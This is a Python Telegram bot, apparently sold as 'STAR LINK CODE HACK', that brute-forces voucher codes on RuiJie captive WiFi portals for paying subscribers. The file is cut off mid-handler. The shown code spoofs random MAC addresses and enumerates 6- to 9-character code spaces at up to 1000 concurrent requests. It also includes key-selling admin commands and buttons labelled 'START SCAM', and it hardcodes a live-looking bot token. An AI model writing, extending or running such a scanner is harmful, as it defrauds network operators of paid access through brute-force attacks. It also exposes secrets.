#!/usr/bin/env python3
"""
STAR LINK CODE HACK — Professional Edition
============================================
Production-grade RuiJie captive-portal voucher scanner.

Author  : God-tier refactor
Version : 2.1.0
"""
from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import random
import re
import signal
import sqlite3
import string
import sys
import time
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, Iterator, List, Optional, Set, Tuple

import aiohttp
import cv2
import ddddocr
import numpy as np
from aiohttp import web
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN: str = "8706721477:AAGEZEbKBfI2gBHi6taWj1ToH2-EStFF6HI"
ADMINS: Tuple[str, ...] = ("8797803204",)
ADMIN_USERNAME: str = "@Nytheris_q"

DB_PATH: str = os.environ.get("DB_PATH", "bot_data.db")
WEB_PORT: int = int(
    os.environ.get("PORT")
    or os.environ.get("BOT_PORT")
    or "8099"
)

MAX_CONCURRENT_SCANS: int = 40
CONCURRENCY: int = 1000
BATCH_SIZE: int = 500
KEY_RECHECK_INTERVAL: float = 600.0

SUCCESS_FILE_TARGETS: Tuple[str, ...] = ADMINS

# Optional outbound proxies (unused by default in this build)
PROXY_LIST: List[str] = []
_proxy_index = 0
_proxy_lock = asyncio.Lock()

# ============================================================
# LOGGING
# ============================================================
def setup_logging() -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(levelname)-7s | %(name)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        stream=sys.stdout,
    )
    logging.getLogger("aiohttp").setLevel(logging.WARNING)
    logging.getLogger("telebot").setLevel(logging.WARNING)

log = logging.getLogger("starlink")

# ============================================================
# DATABASE
# ============================================================
_db_conn: Optional[sqlite3.Connection] = None
_db_lock = asyncio.Lock()

def _get_conn() -> sqlite3.Connection:
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.execute("PRAGMA synchronous=NORMAL")
        _db_conn.row_factory = sqlite3.Row
        c = _db_conn.cursor()
        c.execute(
            """CREATE TABLE IF NOT EXISTS auth_list (
                user_id    TEXT PRIMARY KEY,
                expires_at TEXT,
                plan       TEXT
            )"""
        )
        c.execute(
            """CREATE TABLE IF NOT EXISTS results (
                user_id TEXT NOT NULL,
                code    TEXT NOT NULL,
                plan    TEXT,
                PRIMARY KEY (user_id, code)
            )"""
        )
        _db_conn.commit()
        log.info("Database ready (%s)", DB_PATH)
    return _db_conn

async def _db_run(fn, *args):
    async with _db_lock:
        return await asyncio.to_thread(fn, *args)

def _sync_get_auth_list() -> Dict[str, Dict[str, Any]]:
    c = _get_conn().cursor()
    c.execute("SELECT * FROM auth_list")
    return {r["user_id"]: {"expires_at": r["expires_at"], "plan": r["plan"]}
            for r in c.fetchall()}

def _sync_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
    conn = _get_conn()
    conn.execute(
        "INSERT OR REPLACE INTO auth_list (user_id, expires_at, plan) VALUES (?, ?, ?)",
        (user_id, expires_at, plan),
    )
    conn.commit()

def _sync_delete_key(user_id: str) -> None:
    conn = _get_conn()
    conn.execute("DELETE FROM auth_list WHERE user_id = ?", (user_id,))
    conn.commit()

async def db_get_auth_list() -> Dict[str, Dict[str, Any]]:
    return await _db_run(_sync_get_auth_list)

async def db_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
    await _db_run(_sync_upsert_key, user_id, expires_at, plan)

async def db_delete_key(user_id: str) -> None:
    await _db_run(_sync_delete_key, user_id)

def _sync_get_results(user_id: str) -> List[str]:
    c = _get_conn().cursor()
    c.execute("SELECT code FROM results WHERE user_id = ? ORDER BY rowid ASC", (user_id,))
    return [r["code"] for r in c.fetchall()]

def _sync_add_result(user_id: str, code: str, plan: str = "") -> None:
    conn = _get_conn()
    conn.execute(
        "INSERT OR IGNORE INTO results (user_id, code, plan) VALUES (?, ?, ?)",
        (user_id, code, plan),
    )
    conn.commit()

def _sync_set_results(user_id: str, codes: List[str]) -> None:
    conn = _get_conn()
    conn.execute("DELETE FROM results WHERE user_id = ?", (user_id,))
    for c in codes:
        conn.execute(
            "INSERT OR IGNORE INTO results (user_id, code, plan) VALUES (?, ?, ?)",
            (user_id, c, ""),
        )
    conn.commit()

async def db_get_results(user_id: str) -> List[str]:
    return await _db_run(_sync_get_results, user_id)

async def db_add_result(user_id: str, code: str, plan: str = "") -> None:
    await _db_run(_sync_add_result, user_id, code, plan)

async def db_set_results(user_id: str, codes: List[str]) -> None:
    await _db_run(_sync_set_results, user_id, codes)

# ============================================================
# GLOBAL STATE
# ============================================================
user_data: Dict[int, Dict[str, Any]] = {}
paid_users: Set[str] = set()
scan_tasks: Dict[int, Dict[str, Any]] = {}
success_messages: Dict[int, int] = {}
success_texts: Dict[int, List[str]] = {}
limited_messages: Dict[int, int] = {}
limited_texts: Dict[int, List[str]] = {}

_voucher_sem: Optional[asyncio.Semaphore] = None
_sem_lock = asyncio.Lock()

active_scans_count: int = 0
active_scans_lock = asyncio.Lock()

_start_time: float = time.monotonic()

session: Optional[aiohttp.ClientSession] = None
_connector: Optional[aiohttp.TCPConnector] = None

# ============================================================
# SEMAPHORE / SCAN-SLOT
# ============================================================
async def get_voucher_sem() -> asyncio.Semaphore:
    global _voucher_sem
    if _voucher_sem is None:
        async with _sem_lock:
            if _voucher_sem is None:
                _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    return _voucher_sem

async def acquire_scan_slot() -> bool:
    global active_scans_count
    async with active_scans_lock:
        if active_scans_count >= MAX_CONCURRENT_SCANS:
            return False
        active_scans_count += 1
        return True

async def release_scan_slot() -> None:
    global active_scans_count
    async with active_scans_lock:
        active_scans_count = max(0, active_scans_count - 1)

def cleanup_scan_state(chat_id: int) -> None:
    scan_tasks.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    success_texts.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    if chat_id in user_data:
        user_data[chat_id].pop("current_display_codes", None)

# ============================================================
# HELPERS
# ============================================================
def is_admin(user_id: int | str) -> bool:
    return str(user_id) in ADMINS

def check_key_expiration(data: Any) -> bool:
    try:
        if not isinstance(data, dict):
            return False
        expiry = data.get("expires_at")
        if expiry == "9999-12-31T23:59:59Z":
            return True
        exp = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp
    except Exception as e:
        log.warning("Key parse error: %s", e)
        return False

def generate_expiry(plan: str) -> Optional[str]:
    now = datetime.now(timezone.utc)
    table = {
        "30m": timedelta(minutes=30),
        "1h":  timedelta(hours=1),
        "1d":  timedelta(days=1),
        "7d":  timedelta(days=7),
        "1m":  timedelta(days=30),
        "1y":  timedelta(days=365),
        "unlimited": None,
    }
    if plan not in table:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + table[plan]).isoformat()

def get_mac() -> str:
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first] + [random.randint(0, 0xFF) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in mac)

def replace_mac(url: str, new_mac: str) -> str:
    return re.sub(r"(?<=mac=)[^&]+", new_mac, url)

def minute_to_hour(total_minutes: Any) -> str:
    if total_minutes in (None, "Unknown", "unknown"):
        return "Unknown"
    try:
        mins = int(total_minutes)
        if mins <= 0:
            return "0m"
        h, m = divmod(mins, 60)
        if h and m:
            return f"{h}h {m}m"
        if h:
            return f"{h}h"
        return f"{m}m"
    except Exception:
        return "Unknown"

# ============================================================
# BOT SETUP
# ============================================================
bot = AsyncTeleBot(BOT_TOKEN)

# ============================================================
# KEYBOARDS
# ============================================================
def get_main_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_voucher_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔢 VOUCHER 9 လုံး", callback_data="scan_9"),
        InlineKeyboardButton("🔤 ascii-lower 6", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🔤 ascii-lower 9", callback_data="scan_ascii-lower9"),
        InlineKeyboardButton("🎲 all 6", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔤+🔢 MIXED 9", callback_data="scan_mixed9"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_digit_keyboard(mode: str) -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=5)
    btns = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    kb.add(*btns)
    kb.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_random"))
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return kb

def get_start_scam_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_paid_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန်", callback_data="menu_enter_userid"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_back_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return kb

def get_scam_button_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

# ============================================================
# STATE LOADER
# ============================================================
async def load_paid_users() -> None:
    auth = await db_get_auth_list()
    now = datetime.now(timezone.utc)
    for uid, data in auth.items():
        try:
            expiry = data.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                paid_users.add(uid)
                continue
            exp = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            if now < exp:
                paid_users.add(uid)
        except Exception:
            continue
    log.info("Preloaded %d paid users", len(paid_users))

async def is_paid(user_id: str) -> bool:
    if is_admin(user_id):
        return True
    if user_id in paid_users:
        auth = await db_get_auth_list()
        data = auth.get(user_id)
        if data and check_key_expiration(data):
            return True
        paid_users.discard(user_id)
        return False
    return False

# ============================================================
# MESSAGE EDIT HELPERS (centralized — prevents arg-order bugs)
# ============================================================
async def safe_edit_text(chat_id: int, message_id: int, text: str,
                         reply_markup: Optional[InlineKeyboardMarkup] = None) -> bool:
    try:
        await bot.edit_message_text(
            text=text,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=reply_markup,
        )
        return True
    except Exception as e:
        log.debug("edit_message_text failed: %s", e)
        return False

async def safe_send(chat_id: int, text: str,
                    reply_markup: Optional[InlineKeyboardMarkup] = None,
                    parse_mode: Optional[str] = None) -> bool:
    try:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode,
        )
        return True
    except Exception as e:
        log.debug("send_message failed: %s", e)
        return False

# ============================================================
# COMMAND HANDLERS
# ============================================================
@bot.message_handler(commands=["start"])
async def cmd_start(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    user_name = message.from_user.first_name or message.from_user.username or "User"

    user_data.setdefault(chat_id, {})

    if await is_paid(user_id):
        paid_users.add(user_id)
        welcome = (
            "✨ STAR LINK CODE HACK ✨\n\n"
            f"🪪 NAME: {user_name}\n"
            f"📜 USER ID: {user_id}\n\n"
            "🎁 မင်္ဂလာပါခင်ဗျာ!\n"
            "🎫 သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။\n"
            "♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။\n\n"
            "အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
        )
    else:
        welcome = (
            "✨ STAR LINK CODE HACK ✨\n\n"
            f"🪪 NAME: {user_name}\n"
            f"📜 USER ID: {user_id}\n\n"
            "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            "PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။\n"
            f"👨‍💻 Admin: {ADMIN_USERNAME}"
        )
    await safe_send(chat_id, welcome, reply_markup=get_main_keyboard())

@bot.message_handler(commands=["sendall"])
async def cmd_sendall(message):
    if not is_admin(message.chat.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [message]")
        return
    body = f"📢 ADMIN NOTIFICATION\n\n{args[1]}"
    auth = await db_get_auth_list()
    sent = failed = 0
    for uid in auth:
        try:
            await bot.send_message(int(uid), body)
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1
    await bot.reply_to(message, f"✅ Sent: {sent} | ❌ Failed: {failed}")

@bot.message_handler(commands=["key"])
async def cmd_key(message):
    args = message.text.split()
    user_id = str(message.chat.id)
    if len(args) < 2:
        await bot.reply_to(message, "🔑 ကျေးဇူးပြု၍ KEY ကိုထည့်ပါ:\n/key [your_key]")
        return

    key = args[1]
    auth = await db_get_auth_list()

    target_uid: Optional[str] = None
    if user_id in auth:
        target_uid = user_id
    elif key in auth:
        target_uid = key

    if target_uid and check_key_expiration(auth.get(target_uid, {})):
        paid_users.add(user_id)
        user_data.setdefault(message.chat.id, {})
        await bot.reply_to(
            message,
            f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\n"
            "အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
        )
    elif target_uid:
        await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(
            message,
            f"❌ Key ကို registered မလုပ်ရသေးပါ။\n\nUSER ID: {user_id}\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )

@bot.message_handler(commands=["genkey"])
async def cmd_genkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey <plan> <user_id>\nPlans: 30m|1h|1d|7d|1m|1y|unlimited")
        return
    plan, user_id = args[1], args[2]
    if not user_id.isdigit():
        await bot.reply_to(message, "❌ user_id သည် ဂဏန်းဖြစ်ရပါမည်။")
        return
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited")
        return
    await db_upsert_key(user_id, expiry, plan)
    if check_key_expiration({"expires_at": expiry}):
        paid_users.add(user_id)
    await bot.reply_to(
        message,
        f"✅ Key Generated\n\nUSER ID : {user_id}\nPLAN    : {plan}\nEXPIRES : {expiry}",
    )
    log.info("genkey %s plan=%s by admin %s", user_id, plan, message.chat.id)

@bot.message_handler(commands=["delkey"])
async def cmd_delkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/delkey 123456789")
        return
    user_id = args[1]
    auth = await db_get_auth_list()
    if user_id not in auth:
        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
        return
    await db_delete_key(user_id)
    paid_users.discard(user_id)
    if user_id.isdigit():
        user_data.pop(int(user_id), None)
    await bot.reply_to(message, f"✅ Key Deleted\nUSER ID : {user_id}")

@bot.message_handler(commands=["listkeys"])
async def cmd_listkeys(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    auth = await db_get_auth_list()
    if not auth:
        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
        return
    lines: List[str] = []
    now = datetime.now(timezone.utc)
    for uid, data in auth.items():
        expires = data.get("expires_at", "unknown")
        plan = data.get("plan", "unknown")
        if expires == "9999-12-31T23:59:59Z":
            exp_str = "Unlimited"
        else:
            try:
                exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                if exp_dt < now:
                    exp_str = "Expired"
                else:
                    diff = exp_dt - now
                    d, rem = diff.days, diff.seconds
                    h, rem2 = divmod(rem, 3600)
                    m = rem2 // 60
                    exp_str = f"{d}d {h}h {m}m left"
            except Exception:
                exp_str = expires
        lines.append(f"🪪 {uid}\n   Plan: {plan}\n   Expires: {exp_str}")
    text = f"📋 Registered Keys ({len(auth)})\n\n" + "\n\n".join(lines)
    if len(text) <= 4096:
        await bot.reply_to(message, text)
    else:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i : i + 4096])

@bot.message_handler(commands=["result"])
async def cmd_result(message):
    user_id = str(message.chat.id)
    if not await is_paid(user_id):
        await bot.reply_to(
            message,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )
        return
    results = await db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
        return
    body = "✅ Found Codes:\n" + "\n".join(results)
    if len(body) <= 4096:
        await bot.reply_to(message, body)
    else:
        for i in range(0, len(body), 4096):
            await bot.send_message(message.chat.id, body[i : i + 4096])

@bot.message_handler(commands=["portal"])
async def cmd_portal(message):
    user_id = str(message.chat.id)
    if not await is_paid(user_id):
        await bot.reply_to(
            message,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "🔗 Portal URL ထည့်ရန်:\n\n/portal [your_portal_url]\n\n"
            "ဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00",
        )
        return
    url = args[1].strip()
    if not url.startswith(("http://", "https://")):
        await bot.reply_to(message, "❌ URL သည် http:// သို့မဟုတ် https:// ဖြင့် စရပါမည်။")
        return

    user_data.setdefault(message.chat.id, {})
    await bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")
    if await check_session_url_improved(url):
        user_data[message.chat.id]["session_url"] = url
        await bot.reply_to(
            message,
            "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
            reply_markup=get_voucher_keyboard(),
        )
    else:
        await bot.reply_to(
            message,
            "❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်စစ်ပါ။\n\n"
            "✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
            "`https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00`",
            parse_mode="Markdown",
        )

@bot.message_handler(commands=["scan"])
async def cmd_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "VOUCHER ရွေးချယ်ရန်:\n\n"
            "/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9",
            reply_markup=get_voucher_keyboard(),
        )
        return
    mode = args[1].strip()
    await _start_scan(message.chat.id, mode, message=message)

async def _start_scan(chat_id: int, mode: str, message=None,
                      user_name: Optional[str] = None) -> bool:
    user_id = str(chat_id)

    # --- auth ---
    if not await is_paid(user_id):
        await safe_send(
            chat_id,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )
        return False

    # --- session ---
    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
        await safe_send(chat_id, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်ပါ။")
        return False

    # --- duplicate scan ---
    existing = scan_tasks.get(chat_id)
    if existing and not existing["task"].done():
        await safe_send(chat_id, "Scan သည် အလုပ်လုပ်နေပြီ။ STOP SCAM ဖြင့် ရပ်နိုင်ပါသည်။")
        return False

    # --- validate mode early (before consuming slot) ---
    try:
        test_iter = iter_codes(mode, start_digit=None)
        try:
            next(test_iter)
        except StopIteration:
            pass
    except ValueError as e:
        await safe_send(chat_id, str(e))
        return False

    # --- acquire slot ---
    if not await acquire_scan_slot():
        await safe_send(
            chat_id,
            f"⚠️ Bot အလုပ်များနေပါသည် ({active_scans_count}/{MAX_CONCURRENT_SCANS})။ ခခဏစောင့်ပါ။",
        )
        return False

    try:
        progress_msg = await bot.send_message(chat_id, "🔍 Voucher Code ရှာဖွေနေသည်...")
    except Exception as e:
        log.warning("failed to send progress msg: %s", e)
        await release_scan_slot()
        return False

    scan_id = str(uuid.uuid4())

    # --- notify admins ---
    try:
        if user_name is None and message is not None:
            fu = getattr(message, "from_user", None)
            if fu is not None:
                user_name = fu.first_name or fu.username or "User"
        user_name = user_name or "User"

        portal_url = user_data[chat_id].get("session_url", "Unknown")
        last_url = user_data[chat_id].get("last_admin_notified_url", "")
        if portal_url != last_url and portal_url != "Unknown":
            admin_msg = (
                "🚀 Scan Start\n\n"
                f"🪪 User: {user_name}\n"
                f"📜 User ID: {user_id}\n"
                f"🔢 Mode: {mode}\n"
                f"🔗 URL: {portal_url}"
            )
            for admin_id in ADMINS:
                await safe_send(int(admin_id), admin_msg)
            user_data[chat_id]["last_admin_notified_url"] = portal_url
    except Exception as e:
        log.warning("admin notify failed: %s", e)

    start_digit = user_data[chat_id].get("start_digit")
    task = asyncio.create_task(
        run_bruteforce(
            mode=mode,
            chat_id=chat_id,
            session_url=user_data[chat_id]["session_url"],
            scan_id=scan_id,
            message=message,
            progress_msg=progress_msg,
            start_digit=start_digit,
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    return True

@bot.message_handler(commands=["stop"])
async def cmd_stop(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await _send_success_file(chat_id)
        data["task"].cancel()
        cleanup_scan_state(chat_id)
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

@bot.message_handler(commands=["status"])
async def cmd_status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    uptime = int(time.monotonic() - _start_time)
    h, rem = divmod(uptime, 3600)
    m, s = divmod(rem, 60)
    await bot.reply_to(
        message,
        f"🪫 Bot Status\n\n"
        f"⏳ Uptime: {h}h {m}m {s}s\n"
        f"🔍 Active Scans: {active}/{MAX_CONCURRENT_SCANS}\n"
        f"🎫 Paid Users: {len(paid_users)}\n"
        f"👥 Sessions: {len(user_data)}",
    )

@bot.message_handler(commands=["recheck"])
async def cmd_recheck(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    if not await is_paid(user_id):
        await bot.reply_to(
            message,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )
        return
    if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်ပါ။")
        return

    results = await db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
        return

    await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
    session_url = user_data[chat_id]["session_url"]
    recheck_list: List[str] = []
    for code in results:
        recode = await perform_check(
            session_url, code, chat_id, scan_id=None, recheck=True, message=message
        )
        if recode:
            recheck_list.append(recode)
    body = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ပြီး success code မတွေ့ပါ။"
    await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{body}")
    await db_set_results(user_id, recheck_list)

# ============================================================
# CALLBACK HANDLER
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
async def on_callback(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    data = call.data

    try:
        if data == "menu_back":
            if await is_paid(user_id):
                text = (
                    "✨ STAR LINK CODE HACK ✨\n\n"
                    f"🪪 NAME: {user_name}\n📜 USER ID: {user_id}\n\n"
                    "🎫 PAID USER - Unlimited Access"
                )
            else:
                text = (
                    "✨ STAR LINK CODE HACK ✨\n\n"
                    f"🪪 NAME: {user_name}\n📜 USER ID: {user_id}\n\n"
                    "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
                    "PAID USER ဖြစ်ရန် PAID USER ကိုနှိပ်ပါ။"
                )
            await safe_edit_text(chat_id, call.message.message_id, text, get_main_keyboard())
            return

        if data == "menu_free_trial":
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
                    f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            await safe_edit_text(
                chat_id, call.message.message_id,
                "🔗 Portal URL ထည့်သွင်းရန်:\n\n"
                "/portal [your_portal_url]\n\n"
                "ဥပမာ:\n"
                "/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00\n\n"
                "Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်။",
                get_back_keyboard(),
            )
            return

        if data == "menu_paid":
            await safe_edit_text(
                chat_id, call.message.message_id,
                "🔑 PAID USER ဖြစ်ရန်\n\n"
                "ကျေးဇူးပြု၍ သင်၏ USER ID ကိုထည့်ပါ။\n\n"
                f"USER ID: {user_id}\n\n"
                f"✅ USER ID ကို Admin ထံပေးပြီး Key ဝယ်ပါ။\n"
                f"👨‍💻 Admin: {ADMIN_USERNAME}\n\n"
                "Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ",
                get_paid_keyboard(),
            )
            return

        if data == "menu_enter_userid":
            auth = await db_get_auth_list()
            if user_id in auth and check_key_expiration(auth[user_id]):
                paid_users.add(user_id)
                user_data.setdefault(chat_id, {})
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nMenu မှ ရွေးချယ်ပါ။",
                    get_main_keyboard(),
                )
            elif user_id in auth:
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ Key Expired ဖြစ်နေပါသည်။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
            else:
                for admin_id in ADMINS:
                    await safe_send(
                        int(admin_id),
                        f"🔔 New User Request:\nName: {user_name}\nID: {user_id}\n\n"
                        f"To approve:\n/genkey unlimited {user_id}",
                    )
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ပါ။\n\nUSER ID: {user_id}\n\n"
                    f"Admin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n"
                    f"👨‍💻 Admin: {ADMIN_USERNAME}",
                    get_back_keyboard(),
                )
            return

        if data == "menu_result":
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nAdmin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            results = await db_get_results(user_id)
            text = ("✅ Found Codes:\n" + "\n".join(results)) if results else "📋 Success code မရှိသေးပါ။"
            if len(text) > 4096:
                text = text[:4093] + "..."
            await safe_edit_text(chat_id, call.message.message_id, text, get_back_keyboard())
            return

        if data == "menu_recheck":
            if not await is_paid(user_id):
                await safe_edit_text(
                    chat_id, call.message.message_id,
                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    get_back_keyboard(),
                )
                return
            if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
